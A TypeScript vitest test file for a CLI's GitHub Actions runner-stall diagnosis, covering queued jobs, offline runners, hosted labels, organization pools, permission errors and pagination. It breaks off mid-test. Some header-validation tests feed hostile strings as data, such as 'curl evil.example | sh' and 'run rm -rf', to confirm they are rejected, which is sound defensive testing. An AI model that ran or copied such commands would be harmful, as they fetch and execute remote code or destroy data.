// Tests for ./runner_stall.ts: the runner-availability diagnosis `nen pr ready`
// attaches for a check still waiting on a runner (zheref/nen#224). Every read
// goes through a SCRIPTED source -- the optional half of PrStateSource -- so no
// test here reaches GitHub. The verdict-is-unchanged half lives in
// ../verbs/pr_ready.runners.test.ts, where the whole verb runs; the
// real-GitHubClient half (N2) lives in ../github/client.test.ts.

import { describe, expect, it } from "vitest";
import {
  acceptedHeader,
  actionsJobRef,
  diagnoseWaitingChecks,
  githubHostedLabels,
  MAX_DIAGNOSED_JOBS,
  minutesBetween,
  PULL_REQUEST_FILES_CAP,
  readRunnerList,
  renderRunnerAvailability,
  runnerCarries,
  STALL_FLOOR_MINUTES,
  type DiagnosisContext,
  type RunnerSource,
  type WaitingCheckDiagnosis,
} from "./runner_stall.js";
import type { CheckRun, RollupEntry, StatusContext } from "../github/types.js";

const REPO = { owner: "zheref", repo: "nen" };
const ORG_REPO = { owner: "acme", repo: "app" };
const HEAD = "cafebabe";
const NOW = "2026-10-11T12:00:00Z";
const AN_HOUR_AGO = "2026-10-11T11:00:00Z";
const CTX: DiagnosisContext = { prNumber: 217, headSha: HEAD, now: NOW, inActions: false };
const WINDOWS = ["self-hosted", "Windows", "X64"];
const MACOS = ["self-hosted", "macOS", "ARM64"];

// A QUEUED check run as GitHub really reports one: a real `startedAt` and no
// runner (N1 -- NN-PR-#217's job 105994605680 had exactly this shape).
function queued(name: string, jobId: number | null, repo = "zheref/nen"): CheckRun {
  return {
    kind: "check_run",
    name,
    status: "QUEUED",
    conclusion: null,
    startedAt: "2026-10-11T11:00:01Z",
    completedAt: null,
    detailsUrl: jobId === null ? null : `https://github.com/${repo}/actions/runs/38164140114/job/${jobId}`,
    // Round-3 R1: an Actions check run's id IS its job's id, under the
    // `github-actions` app -- what GraphQL answers for one (seen live on
    // NN-PR-#394).
    ...(jobId === null ? {} : { databaseId: jobId, appSlug: "github-actions" }),
  };
}

let nextRunnerId = 1;
function runner(name: string, status: "online" | "offline", labels: readonly string[], busy = false, id?: number): unknown {
  return {
    id: id ?? nextRunnerId++,
    name,
    status,
    busy,
    labels: labels.map((label) => ({ id: 1, name: label, type: "read-only" })),
  };
}

/** Live shape of zheref/nen with the Windows pool offline (2026-10-11). */
const MAC_ONLINE_WINDOWS_OFFLINE = [
  runner("NZ-NNR1", "offline", WINDOWS),
  runner("NZ-NNR2", "offline", WINDOWS),
  runner("NZ-NNR3", "offline", WINDOWS),
  runner("RJ2-NNR1", "online", MACOS),
  runner("RJ2-NNR2", "online", MACOS, true),
  runner("RJ2-NNR3", "online", MACOS),
];

interface Script {
  readonly jobs?: Readonly<Record<number, unknown>>;
  readonly jobError?: unknown;
  readonly repoPages?: readonly unknown[];
  readonly repoError?: unknown;
  readonly accountType?: string;
  readonly accountError?: unknown;
  readonly orgPages?: readonly unknown[];
  readonly orgError?: unknown;
  readonly files?: readonly unknown[];
  readonly filesError?: unknown;
}

function scripted(script: Script): { source: RunnerSource; calls: string[] } {
  const calls: string[] = [];
  const source: RunnerSource = {
    actionsJob: async (_repo, jobId): Promise<unknown> => {
      calls.push(`job ${jobId}`);
      if (script.jobError !== undefined) throw script.jobError;
      const job = script.jobs?.[jobId];
      if (job === undefined) throw Object.assign(new Error("Not Found"), { status: 404 });
      return job;
    },
    repoRunnersPage: async (_repo, page): Promise<unknown> => {
      calls.push(`repo runners ${page}`);
      if (script.repoError !== undefined) throw script.repoError;
      return script.repoPages?.[page - 1] ?? { total_count: 0, runners: [] };
    },
    accountType: async (login): Promise<string> => {
      calls.push(`account ${login}`);
      if (script.accountError !== undefined) throw script.accountError;
      return script.accountType ?? "User";
    },
    orgRunnersPage: async (org, page): Promise<unknown> => {
      calls.push(`org runners ${org} ${page}`);
      if (script.orgError !== undefined) throw script.orgError;
      return script.orgPages?.[page - 1] ?? { total_count: 0, runners: [] };
    },
    pullRequestFiles: async (): Promise<unknown[]> => {
      calls.push("files");
      if (script.filesError !== undefined) throw script.filesError;
      return [...(script.files ?? [{ filename: "src/index.ts" }])];
    },
  };
  return { source, calls };
}

interface JobFields {
  readonly status?: string;
  readonly runner?: string | null;
  readonly createdAt?: string | null;
  readonly head?: string;
  readonly id?: number;
  readonly conclusion?: string | null;
}

function job(labels: readonly string[], fields: JobFields = {}): unknown {
  const id = fields.id ?? 7;
  return {
    id,
    status: fields.status ?? "queued",
    conclusion: fields.conclusion ?? null,
    labels,
    runner_name: fields.runner ?? null,
    head_sha: fields.head ?? HEAD,
    check_run_url: `https://api.github.com/repos/zheref/nen/check-runs/${id}`,
    ...(fields.createdAt === null ? {} : { created_at: fields.createdAt ?? AN_HOUR_AGO }),
  };
}

function httpError(status: number, headers: Record<string, string> = {}, message?: string): Error {
  return Object.assign(new Error(`HTTP ${status}`), {
    status,
    response: { headers, data: message === undefined ? {} : { message } },
  });
}

const pool = (runners: readonly unknown[]): unknown => ({ total_count: runners.length, runners });

async function one(
  script: Script,
  entry: RollupEntry = queued("w", 7),
  ctx: DiagnosisContext = CTX,
  repo = REPO,
): Promise<{ diagnosis: WaitingCheckDiagnosis | undefined; calls: string[] }> {
  const { source, calls } = scripted(script);
  const [diagnosis] = await diagnoseWaitingChecks(source, repo, [entry], ctx);
  return { diagnosis, calls };
}

describe("actionsJobRef / githubHostedLabels / runnerCarries / acceptedHeader", () => {
  it("reads the job id off an Actions details URL, and nothing else", () => {
    expect(actionsJobRef("https://github.com/zheref/nen/actions/runs/1/job/114543053976")).toEqual({
      owner: "zheref",
      repo: "nen",
      jobId: 114543053976,
    });
    expect(actionsJobRef("https://github.com/zheref/nen/actions/runs/1/job/9?pr=3")?.jobId).toBe(9);
    expect(actionsJobRef("https://ci.example.com/build/9")).toBeNull();
    expect(actionsJobRef("https://github.com.evil/zheref/nen/actions/runs/1/job/9")).toBeNull();
    expect(actionsJobRef(null)).toBeNull();
  });

  it("N3: admits the standard hosted labels, per family", () => {
    for (const label of [
      "ubuntu-latest",
      "ubuntu-slim",
      "ubuntu-22.04",
      "ubuntu-24.04",
      "ubuntu-24.04-arm",
      "ubuntu-22.04-arm",
      // Nobunaga round-3 R1: the six labels today's runner-images README adds.
      "ubuntu-26.04",
      "ubuntu-26.04-arm",
      "windows-2025-vs2026",
      "windows-11-vs2026-arm",
      "xcode-26",
      "xcode-26-xlarge",
      "windows-latest",
      "windows-2022",
      "windows-2025",
      "windows-11-arm",
      "macos-latest",
      "macos-14",
      "macos-15",
      "macos-15-intel",
      "macos-15-xlarge",
      "macos-14-large",
      "macos-latest-xlarge",
    ]) {
      expect(githubHostedLabels([label]), label).toBe(true);
    }
  });

  it("N3: refuses the lookalikes a self-hosted pool could carry", () => {
    for (const label of [
      "ubuntu-99",
      "ubuntu-20.04",
      "ubuntu-latest-arm",
      "ubuntu-24.04-large",
      "windows-2019",
      "windows-latest-arm",
      "windows-11",
      "macos-12",
      "macos-12-xlarge",
      // N10: retired November 2025 -- a job pinned to it never starts.
      "macos-13",
      "macos-13-intel",
      "macos-latest-intel",
      "ubuntu-slim-arm",
      "windows-2022-vs2026",
      "windows-vs2026",
      "xcode-latest",
      "xcode-26-large",
      "macos-latest-arm",
      "macos-15-arm64",
    ]) {
      expect(githubHostedLabels([label]), label).toBe(false);
    }
    expect(githubHostedLabels(["self-hosted", "Windows", "X64"])).toBe(false);
    expect(githubHostedLabels(["ubuntu-latest", "gpu"])).toBe(false);
    expect(githubHostedLabels([])).toBe(false);
  });

  it("matches every label, case-insensitively, as GitHub routes", () => {
    expect(runnerCarries(["self-hosted", "windows", "x64", "extra"], WINDOWS)).toBe(true);
    expect(runnerCarries(MACOS, WINDOWS)).toBe(false);
  });

  it("F4: repeats a permissions header only when it is shaped like one and short", () => {
    expect(acceptedHeader("administration=read")).toBe("administration=read");
    expect(acceptedHeader("repo, admin:org")).toBe("repo, admin:org");
    expect(acceptedHeader("administration=read,actions=write")).toBe("administration=read,actions=write");
    // N12: `admin` levels and `;` separators, as GitHub sends them.
    expect(acceptedHeader("organization_administration=admin; repo")).toBe("organization_administration=admin; repo");
    expect(acceptedHeader("administration=admin;actions=read")).toBe("administration=admin;actions=read");
    expect(acceptedHeader("administration=owner")).toBeNull();
    expect(acceptedHeader("admin=root; run rm -rf")).toBeNull();
    expect(acceptedHeader("\u001b[2Jadministration=read")).toBeNull();
    expect(acceptedHeader("Administration=Read")).toBeNull();
    expect(acceptedHeader("a".repeat(201))).toBeNull();
    expect(acceptedHeader("")).toBeNull();
    expect(acceptedHeader(undefined)).toBeNull();
  });

  it("minutesBetween reads whole minutes, and null for the unreadable or the future", () => {
    expect(minutesBetween(AN_HOUR_AGO, NOW)).toBe(60);
    expect(minutesBetween(null, NOW)).toBeNull();
    expect(minutesBetween("not a date", NOW)).toBeNull();
    expect(minutesBetween("2026-10-11T13:00:00Z", NOW)).toBeNull();
    // N15: up to two minutes ahead is clock skew, read as just queued.
    expect(minutesBetween("2026-10-11T12:01:00Z", NOW)).toBe(0);
    expect(minutesBetween("2026-10-11T12:02:00Z", NOW)).toBe(0);
    expect(minutesBetween("2026-10-11T12:03:00Z", NOW)).toBeNull();
  });
});

describe("diagnoseWaitingChecks -- the determinations", () => {
  it("OFFLINE-ONLY, queued an hour: an infrastructure stall, with the queue age carried", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)] });
    expect(diagnosis).toMatchObject({
      check: "w",
      jobId: 7,
      labels: WINDOWS,
      queuedSince: AN_HOUR_AGO,
      queuedMinutes: 60,
      determination: "offline-only",
      infrastructureStall: true,
      labelsFromPrHead: false,
      missingPermission: null,
    });
    expect(diagnosis?.runners.map((each) => each.name)).toEqual(["NZ-NNR1", "NZ-NNR2", "NZ-NNR3"]);
    expect(diagnosis?.detail).toMatch(/^INFRASTRUCTURE STALL: every runner carrying these labels is offline \(NZ-NNR1 \(offline\)/);
    expect(diagnosis?.detail).toContain("queued 1 h 0 min");
    // N14: the stall line is hedged on the one thing the files read cannot see.
    expect(diagnosis?.detail).toMatch(/waiting will not turn it green, unless this PR changes what computes runs-on$/);
  });

  it("ONLINE: names only the ONLINE runners (F3), busy included, and never asks the organization", async () => {
    const pages = [pool([...MAC_ONLINE_WINDOWS_OFFLINE, runner("NZ-NNR9", "online", WINDOWS, true)])];
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS) }, repoPages: pages });
    expect(diagnosis).toMatchObject({ determination: "online", infrastructureStall: false });
    expect(diagnosis?.runners).toEqual([{ name: "NZ-NNR9", status: "online", busy: true }]);
    expect(diagnosis?.detail).toContain("(NZ-NNR9 (online, busy))");
    expect(diagnosis?.detail).not.toContain("NZ-NNR1");
    // One page, then its N13 re-read.
    expect(calls).toEqual(["job 7", "repo runners 1", "repo runners 1"]);
  });

  it("NO-RUNNER, queued an hour: a stall, hedged for enterprise and on-demand pools (N4)", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(["self-hosted", "Linux", "GPU"]) },
      repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)],
    });
    expect(diagnosis).toMatchObject({ determination: "no-runner", infrastructureStall: true, runners: [] });
    expect(diagnosis?.detail).toContain("enterprise runners are not enumerated");
    expect(diagnosis?.detail).toContain("an autoscaled or ephemeral pool registers runners only on demand");
  });

  it("GITHUB-HOSTED: no listed runner carries the label, so it is always available", async () => {
    const { diagnosis, calls } = await one({ jobs: { 7: job(["ubuntu-latest"]) }, repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)] });
    expect(diagnosis).toMatchObject({ determination: "github-hosted", infrastructureStall: false });
    expect(calls).toEqual(["job 7", "repo runners 1", "repo runners 1"]);
  });

  it("GITHUB-HOSTED even when the runner list cannot be read: the hosted fleet does not depend on it", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(["ubuntu-latest"]) }, repoError: httpError(403) });
    expect(diagnosis?.determination).toBe("github-hosted");
  });

  it("N3: a LISTED runner carrying hosted-looking labels is consulted before the hosted short-circuit", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(["ubuntu-latest"]) },
      repoPages: [pool([runner("fake-ubuntu", "offline", ["self-hosted", "ubuntu-latest"])])],
    });
    expect(diagnosis).toMatchObject({ determination: "offline-only", infrastructureStall: true });
    expect(diagnosis?.runners.map((each) => each.name)).toEqual(["fake-ubuntu"]);
  });

  it("STARTED: a job a runner picked up after the rollup was read is not queued any more", async () => {
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS, { status: "in_progress", runner: "NZ-NNR2" }) } });
    expect(diagnosis).toMatchObject({ determination: "started", infrastructureStall: false });
    expect(diagnosis?.detail).toContain("in_progress on runner NZ-NNR2");
    // Round-3 R3: not queued for a runner, so no queue age.
    expect(diagnosis).toMatchObject({ queuedSince: null, queuedMinutes: null });
    expect(calls).toEqual(["job 7"]);
  });

  it("N6: a job completed with no runner says so, with its conclusion", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS, { status: "completed", runner: "", conclusion: "cancelled" }) } });
    expect(diagnosis).toMatchObject({ determination: "started", infrastructureStall: false });
    expect(diagnosis?.detail).toBe("no longer queued: the job is completed (cancelled) without a runner");
  });

  it("N7: a job WAITING on an environment protection rule is not waiting on a runner", async () => {
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS, { status: "waiting" }) } });
    expect(diagnosis).toMatchObject({
      determination: "environment-wait",
      infrastructureStall: false,
      queuedSince: null,
      queuedMinutes: null,
    });
    expect(diagnosis?.detail).toBe("waiting on an environment protection rule, not on a runner");
    expect(calls).toEqual(["job 7"]);
  });

  it("custom labels with no self-hosted and no listed carrier are UNDETERMINED (a hosted larger runner may carry them)", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(["big-linux-box"]) }, repoPages: [pool([])] });
    expect(diagnosis).toMatchObject({ determination: "undetermined", infrastructureStall: null });
    expect(diagnosis?.detail).toContain("larger runner");
  });

  it("reads the runner list ONCE (one walk plus its page-1 re-read) for every check that needs it", async () => {
    const { source, calls } = scripted({
      jobs: { 7: job(WINDOWS), 8: job(MACOS, { id: 8 }) },
      repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)],
    });
    const out = await diagnoseWaitingChecks(source, REPO, [queued("w", 7), queued("m", 8)], CTX);
    expect(out.map((each) => each.determination)).toEqual(["offline-only", "online"]);
    expect(calls.filter((call) => call.startsWith("repo runners"))).toEqual(["repo runners 1", "repo runners 1"]);
  });
});

describe("diagnoseWaitingChecks -- N4: the queue-age floor", () => {
  it(`below ${STALL_FLOOR_MINUTES} minutes an offline-only pool is reported but NOT called a stall`, async () => {
    const { diagnosis, calls } = await one({
      jobs: { 7: job(WINDOWS, { createdAt: "2026-10-11T11:55:00Z" }) },
      repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)],
    });
    expect(diagnosis).toMatchObject({ determination: "offline-only", infrastructureStall: false, queuedMinutes: 5 });
    expect(diagnosis?.detail).toContain(
      "queued 5 min; too young to call a stall (an autoscaled or ephemeral pool may still register a runner)",
    );
    expect(diagnosis?.detail).not.toContain("INFRASTRUCTURE STALL");
    // A young queue never reads the PR's files: there is no stall to qualify.
    expect(calls).not.toContain("files");
  });

  it("the same floor holds for no-runner", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(["self-hosted", "GPU"], { createdAt: "2026-10-11T11:51:00Z" }) },
      repoPages: [pool([])],
    });
    expect(diagnosis).toMatchObject({ determination: "no-runner", infrastructureStall: false, queuedMinutes: 9 });
  });

  it(`exactly ${STALL_FLOOR_MINUTES} minutes is old enough`, async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS, { createdAt: "2026-10-11T11:50:00Z" }) },
      repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)],
    });
    expect(diagnosis?.infrastructureStall).toBe(true);
  });

  it("an unreadable queue age calls no stall: null, said", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS, { createdAt: null }) },
      repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)],
    });
    expect(diagnosis).toMatchObject({ determination: "offline-only", infrastructureStall: null, queuedSince: null });
    expect(diagnosis?.detail).toContain("the queue age could not be read");
  });
});

describe("diagnoseWaitingChecks -- F1: the job must be THIS check's at the judged head", () => {
  it("round-3 R1: a THIRD-PARTY check pointing at a real stalled Actions job is never attributed that stall", async () => {
    const thirdParty: CheckRun = { ...queued("Cursor Bugbot", 7), databaseId: 114551065677, appSlug: "cursor" };
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS) }, repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)] }, thirdParty);
    expect(diagnosis).toMatchObject({ check: "Cursor Bugbot", determination: "undetermined", infrastructureStall: null });
    expect(diagnosis?.detail).toContain("its details URL names a job that is not this check's");
    expect(calls).toEqual([]);
  });

  it("round-3 R1: an Actions check whose id is not the job id in its URL is not that job", async () => {
    const other: CheckRun = { ...queued("w", 7), databaseId: 8 };
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS) } }, other);
    expect(diagnosis?.detail).toContain("names a job that is not this check's");
    expect(calls).toEqual([]);
  });

  it("round-3 R1: an unreadable check-run id or app is undetermined", async () => {
    const noApp: CheckRun = { ...queued("w", 7), appSlug: null };
    const noId: CheckRun = { ...queued("w", 7), databaseId: undefined };
    for (const entry of [noApp, noId]) {
      const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS) } }, entry);
      expect(diagnosis?.determination).toBe("undetermined");
      expect(diagnosis?.detail).toContain("the check run's id or app could not be read");
      expect(calls).toEqual([]);
    }
  });

  it("a job at another head is undetermined", async () => {
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS, { head: "deadbeef" }) }, repoPages: [pool([])] });
    expect(diagnosis).toMatchObject({ determination: "undetermined", infrastructureStall: null });
    expect(diagnosis?.detail).toContain("its details URL names a job that is not this check's");
    expect(calls).toEqual(["job 7"]);
  });

  it("a job whose check_run_url names another check run is undetermined", async () => {
    const forged = { ...(job(WINDOWS) as Record<string, unknown>), check_run_url: "https://api.github.com/repos/zheref/nen/check-runs/70" };
    const { diagnosis } = await one({ jobs: { 7: forged } });
    expect(diagnosis?.detail).toContain("names a job that is not this check's");
  });

  it("an unread judged head matches nothing", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) } }, queued("w", 7), { ...CTX, headSha: "" });
    expect(diagnosis?.determination).toBe("undetermined");
  });
});

describe("diagnoseWaitingChecks -- F2: a PR that edits its own workflows", () => {
  const stalled: Script = { jobs: { 7: job(WINDOWS) }, repoPages: [pool(MAC_ONLINE_WINDOWS_OFFLINE)] };

  it("a .github/workflows change makes the stall undetermined, labelsFromPrHead: true", async () => {
    const { diagnosis } = await one({ ...stalled, files: [{ filename: "src/a.ts" }, { filename: ".github/workflows/ci.yml" }] });
    expect(diagnosis).toMatchObject({ determination: "undetermined", infrastructureStall: null, labelsFromPrHead: true });
    expect(diagnosis?.detail).toContain("this pull request changes .github/, so its own author may have set these runs-on labels");
  });

  it("N14: any change under .github/ counts -- a composite action can compute runs-on too", async () => {
    const { diagnosis } = await one({ ...stalled, files: [{ filename: ".github/actions/matrix/action.yml" }] });
    expect(diagnosis).toMatchObject({ determination: "undetermined", labelsFromPrHead: true });
    const { diagnosis: lookalike } = await one({ ...stalled, files: [{ filename: "docs/.github-notes.md" }] });
    expect(lookalike).toMatchObject({ infrastructureStall: true, labelsFromPrHead: false });
  });

  it("a workflow renamed AWAY counts too", async () => {
    const { diagnosis } = await one({
      ...stalled,
      files: [{ filename: "ci/old.yml", previous_filename: ".github/workflows/old.yml" }],
    });
    expect(diagnosis?.labelsFromPrHead).toBe(true);
  });

  it("unreadable files fail closed: undetermined, the grant named on a 403", async () => {
    const { diagnosis } = await one({ ...stalled, filesError: httpError(403) });
    expect(diagnosis).toMatchObject({ determination: "undetermined", labelsFromPrHead: null });
    expect(diagnosis?.missingPermission).toContain("pull_requests:read");
  });

  it(`a list at GitHub's ${PULL_REQUEST_FILES_CAP}-file cap fails closed`, async () => {
    const files = Array.from({ length: PULL_REQUEST_FILES_CAP }, (_, index) => ({ filename: `f${index}` }));
    const { diagnosis } = await one({ ...stalled, files });
    expect(diagnosis?.determination).toBe("undetermined");
    expect(diagnosis?.detail).toContain("3000-file cap");
  });

  it("a file entry with no filename fails closed", async () => {
    const { diagnosis } = await one({ ...stalled, files: [{ status: "added" }] });
    expect(diagnosis?.determination).toBe("undetermined");
  });
});

describe("diagnoseWaitingChecks -- organization runners (F3: counted, never named)", () => {
  it("an online organization match is online, counted -- no organization runner name anywhere", async () => {
    const { diagnosis, calls } = await one(
      {
        jobs: { 7: job(WINDOWS) },
        repoPages: [pool([])],
        accountType: "Organization",
        orgPages: [pool([runner("ORG-WIN-SECRET", "online", WINDOWS), runner("ORG-WIN-2", "offline", WINDOWS)])],
      },
      queued("w", 7, "acme/app"),
      CTX,
      ORG_REPO,
    );
    expect(diagnosis).toMatchObject({ determination: "online", organizationRunners: { online: 1, offline: 1 }, runners: [] });
    expect(diagnosis?.detail).toContain("1 online organization runner");
    expect(JSON.stringify(diagnosis)).not.toContain("ORG-WIN");
    expect(calls).toEqual(["job 7", "repo runners 1", "repo runners 1", "account acme", "org runners acme 1", "org runners acme 1"]);
  });

  it("an all-offline organization pool is a count in the stall line", async () => {
    const { diagnosis } = await one(
      {
        jobs: { 7: job(WINDOWS) },
        repoPages: [pool([])],
        accountType: "Organization",
        orgPages: [pool([runner("ORG-A", "offline", WINDOWS), runner("ORG-B", "offline", WINDOWS)])],
      },
      queued("w", 7, "acme/app"),
      CTX,
      ORG_REPO,
    );
    expect(diagnosis).toMatchObject({ determination: "offline-only", infrastructureStall: true });
    expect(diagnosis?.detail).toContain("2 organization runners carry these labels, all offline");
    expect(JSON.stringify(diagnosis)).not.toContain("ORG-");
  });

  it("never reads an organization pool for a user-owned repository", async () => {
    const { diagnosis, calls } = await one({ jobs: { 7: job(WINDOWS) }, repoPages: [pool([])] });
    expect(diagnosis?.determination).toBe("no-runner");
    expect(diagnosis?.organizationRunners).toBeNull();
    expect(calls.some((call) => call.startsWith("org runners"))).toBe(false);
  });

  it("an org pool the token may not read leaves an offline-only repository match UNDETERMINED, naming admin:org", async () => {
    const { diagnosis } = await one(
      {
        jobs: { 7: job(WINDOWS) },
        repoPages: [pool([runner("NZ-NNR1", "offline", WINDOWS)])],
        accountType: "Organization",
        orgError: httpError(403),
      },
      queued("w", 7, "acme/app"),
      CTX,
      ORG_REPO,
    );
    expect(diagnosis).toMatchObject({ determination: "undetermined", infrastructureStall: null });
    expect(diagnosis?.missingPermission).toContain("admin:org");
    expect(diagnosis?.runners.map((each) => each.name)).toEqual(["NZ-NNR1"]);
  });

  it("N11: both pools refused -- every distinct grant in missingPermissions, the first kept as missingPermission", async () => {
    const { diagnosis } = await one(
      {
        jobs: { 7: job(WINDOWS) },
        repoError: httpError(403),
        accountType: "Organization",
        orgError: httpError(403),
      },
      queued("w", 7, "acme/app"),
      CTX,
      ORG_REPO,
    );
    expect(diagnosis?.determination).toBe("undetermined");
    expect(diagnosis?.missingPermissions).toEqual([
      "administration:read on the repository (classic token: repo, held by a repository admin)",
      "organization_self_hosted_runners:read (classic token: admin:org)",
    ]);
    expect(diagnosis?.missingPermission).toBe(diagnosis?.missingPermissions[0]);
    const lines = renderRunnerAvailability(diagnosis === undefined ? [] : [diagnosis]);
    expect(lines).toContain(
      "      missing permissions: administration:read on the repository (classic token: repo, held by a repository admin); organization_self_hosted_runners:read (classic token: admin:org)",
    );
  });

  it("N11: the same grant refused twice is listed once", async () => {
    const { diagnosis } = await one(
      {
        jobs: { 7: job(WINDOWS) },
        repoError: httpError(403, { "x-accepted-oauth-scopes": "repo" }),
        accountType: "Organization",
        orgError: httpError(403, { "x-accepted-oauth-scopes": "repo" }),
      },
      queued("w", 7, "acme/app"),
      CTX,
      ORG_REPO,
    );
    expect(diagnosis?.missingPermissions).toEqual(["repo"]);
  });

  it("an organization owner on a transport that cannot read its pool is undetermined, said so", async () => {
    const { source } = scripted({ jobs: { 7: job(WINDOWS) }, repoPages: [pool([])], accountType: "Organization" });
    const [diagnosis] = await diagnoseWaitingChecks({ ...source, orgRunnersPage: undefined }, ORG_REPO, [queued("w", 7, "acme/app")], CTX);
    expect(diagnosis?.determination).toBe("undetermined");
    expect(diagnosis?.detail).toContain("this transport cannot read organization runners");
  });

  it("an account type that cannot be read is undetermined, never 'no organization pool'", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoPages: [pool([])], accountError: new Error("socket hang up") });
    expect(diagnosis?.determination).toBe("undetermined");
    expect(diagnosis?.detail).toContain("socket hang up");
  });
});

describe("diagnoseWaitingChecks -- unreadable reads say so, and name the permission", () => {
  it("F5: a 403 on the runners list reads 'runner diagnosis unavailable without <grant>; the gate does not need it'", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS) },
      repoError: httpError(403, { "x-accepted-github-permissions": "administration=read" }, "Resource not accessible by personal access token"),
    });
    expect(diagnosis).toMatchObject({ determination: "undetermined", infrastructureStall: null, missingPermission: "administration=read" });
    expect(diagnosis?.detail).toBe(
      "runner diagnosis unavailable without administration=read (HTTP 403 trying to list zheref/nen's self-hosted runners: Resource not accessible by personal access token); the gate does not need it",
    );
  });

  it("F5: inside GitHub Actions the grant hint is omitted", async () => {
    const { diagnosis } = await one(
      { jobs: { 7: job(WINDOWS) }, repoError: httpError(403, { "x-accepted-github-permissions": "administration=read" }) },
      queued("w", 7),
      { ...CTX, inActions: true },
    );
    expect(diagnosis).toMatchObject({ determination: "undetermined", missingPermission: null });
    expect(diagnosis?.detail).toBe(
      "runner diagnosis unavailable (HTTP 403 trying to list zheref/nen's self-hosted runners); the gate does not need it",
    );
  });

  it("a 403 with no header names the documented grant, classic scope included", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoError: httpError(403) });
    expect(diagnosis?.missingPermission).toBe("administration:read on the repository (classic token: repo, held by a repository admin)");
  });

  it("N9: the OAuth scopes header names the grant when the permissions header is absent", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoError: httpError(403, { "x-accepted-oauth-scopes": "repo" }) });
    expect(diagnosis?.missingPermission).toBe("repo");
  });

  it("F4: a malformed header is never repeated; the documented grant is named", async () => {
    const { diagnosis } = await one({
      jobs: { 7: job(WINDOWS) },
      repoError: httpError(403, { "x-accepted-github-permissions": "admin; curl evil.example | sh" }),
    });
    expect(diagnosis?.missingPermission).toContain("administration:read on the repository");
    expect(diagnosis?.detail).not.toContain("evil");
  });

  it("a 404 on the RUNNERS endpoint is the hidden-endpoint refusal, never an empty pool", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoError: httpError(404) });
    expect(diagnosis?.determination).toBe("undetermined");
    expect(diagnosis?.detail).toContain("runner diagnosis unavailable without administration:read");
  });

  it("N5: a 404 on the JOBS endpoint is a job not found, with no permission claimed", async () => {
    const { diagnosis } = await one({ jobError: httpError(404) });
    expect(diagnosis).toMatchObject({ determination: "undetermined", missingPermission: null, missingPermissions: [] });
    expect(diagnosis?.detail).toContain("Actions job 7 not found (deleted or not visible)");
  });

  it("a 403 on the jobs endpoint names actions:read", async () => {
    const { diagnosis, calls } = await one({ jobError: httpError(403) });
    expect(diagnosis).toMatchObject({ determination: "undetermined", labels: null });
    expect(diagnosis?.missingPermission).toContain("actions:read");
    expect(calls).toEqual(["job 7"]);
  });

  it("a generic failure says GitHub's message once, never beside octokit's copy of it", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoError: httpError(500, {}, "Server Error") });
    expect(diagnosis?.detail).toContain("could not list zheref/nen's self-hosted runners (Server Error)");
    expect(diagnosis?.detail).not.toContain("HTTP 500");
  });

  it("a network failure is reported as itself, with no permission claimed", async () => {
    const { diagnosis } = await one({ jobs: { 7: job(WINDOWS) }, repoError: new Error("ECONNRESET") });
    expect(diagnosis).toMatchObject({ determination: "undetermined", missingPermission: null });
    expect(diagnosis?.detail).toContain("ECONNRESET");
  });

  it("a source without the reads says the transport cannot, never omits the check", async () => {
    const out = await diagnoseWaitingChecks({}, REPO, [queued("w", 7)], CTX);
    expect(out).toHaveLength(1);
    expect(out[0]?.detail).toContain("this transport cannot read Actions jobs");
  });
});

describe("readRunnerList -- pagination, and truncation failing closed (N8)", () => {
  const fetchFrom =
    (pages: readonly unknown[]) =>
    async (page: number): Promise<unknown> =>
      pages[page - 1] ?? { total_count: 0, runners: [] };

  it("walks every page until the distinct ids reach total_count", async () => {
    const pages = [
      { total_count: 3, runners: [runner("a", "offline", WINDOWS, false, 1), runner("b", "offline", WINDOWS, false, 2)] },
      { total_count: 3, runners: [runner("c", "online", WINDOWS, false, 3)] },
    ];
    const list = await readRunnerList(fetchFrom(pages), "list runners", "perm");
    expect(list.ok && list.runners.map((each) => each.name)).toEqual(["a", "b", "c"]);
  });

  it("a runner repeated across pages is counted once: the list is not complete until a new id arrives", async () => {
    const pages = [
      { total_count: 3, runners: [runner("a", "offline", WINDOWS, false, 1), runner("b", "offline", WINDOWS, false, 2)] },
      { total_count: 3, runners: [runner("b", "offline", WINDOWS, false, 2)] },
      { total_count: 3, runners: [] },
    ];
    const list = await readRunnerList(fetchFrom(pages), "list runners", "perm");
    expect(list.ok).toBe(false);
    expect(!list.ok && list.reason).toContain("page 3 was empty after 2 of 3 runners");
  });

  it("a total_count that moves on a later page is an incomplete list", async () => {
    const pages = [
      { total_count: 2, runners: [runner("a", "offline", WINDOWS, false, 1)] },
      { total_count: 3, runners: [runner("b", "offline", WINDOWS, false, 2)] },
    ];
